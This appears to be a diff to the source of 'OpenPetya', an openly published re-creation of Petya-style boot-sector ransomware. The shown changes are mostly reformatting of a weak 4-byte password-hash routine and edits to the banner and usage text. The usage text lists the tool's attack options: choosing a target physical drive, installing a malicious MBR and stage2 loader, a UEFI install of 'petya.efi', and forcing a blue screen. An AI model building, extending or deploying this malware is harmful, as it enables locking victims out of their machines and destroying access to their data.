@@ -74,9 +74,7 @@ struct stDriveInfo
     std::wstring szPath;
 };
 
-bool fnComputePasswordHash(
-    const std::string& password,
-    std::vector<BYTE>& outHash)
+bool fnComputePasswordHash(const std::string& password, std::vector<BYTE>& outHash)
 {
     const uint32_t FNV_OFFSET_BASIS = 2166136261UL;
     const uint32_t FNV_PRIME = 16777619UL;
@@ -91,11 +89,7 @@ bool fnComputePasswordHash(
 
     outHash.resize(4);
 
-    memcpy(
-        outHash.data(),
-        &hash,
-        sizeof(hash)
-    );
+    memcpy(outHash.data(), &hash, sizeof(hash));
 
     return true;
 }
@@ -894,8 +888,9 @@ void fnPrintBanner()
         )" << std::endl;
 
     std::cout << "OpenPetya v2.0.0" << std::endl;
-    std::cout << "Author: iss4cf0ng/ISSAC" << std::endl;
-    std::cout << "GitHub: https://github.com/iss4cf0ng/OpenPetya/" << std::endl;
+    std::cout << "Author : iss4cf0ng/ISSAC" << std::endl;
+    std::cout << "GitHub : https://github.com/iss4cf0ng/OpenPetya/" << std::endl;
+    std::cout << "Blog   : https://iss4cf0ng.github.io/" << std::endl;
 }
 
 /// @brief Print usage
@@ -909,7 +904,7 @@ void fnPrintUsage(const char* szProg)
           << "  --drive N                    Select target physical drive (default: 0)\n\n"
 
           << "Legacy BIOS Commands:\n"
-          << "  --install <mbr> <stage>      Full MBR & stage2 installation\n"
+          << "  --install <mbr> <stage2>     Full MBR & stage2 installation\n"
           << "  --backup-mbr <file>          Backup MBR to specified file\n"
           << "  --restore-mbr <file>         Restore original MBR from file\n"
           << "  --save-chainload             Save MBR to sector 63\n"
@@ -935,7 +930,7 @@ void fnPrintUsage(const char* szProg)
           << "  " << szProg << " --bsod\n"
           << "  " << szProg << " --drive 1 --validate\n"
           << "  " << szProg << " --drive 1 --backup-mbr mbr_backup.bin\n"
-          << "  " << szProg << " --drive 1 --install stage2.mbr bootloader.bin\n"
+          << "  " << szProg << " --drive 1 --install mbr.bin stage2.bin\n"
           << "  " << szProg << " --drive 1 --uefi-install petya.efi\n\n";
 }
 
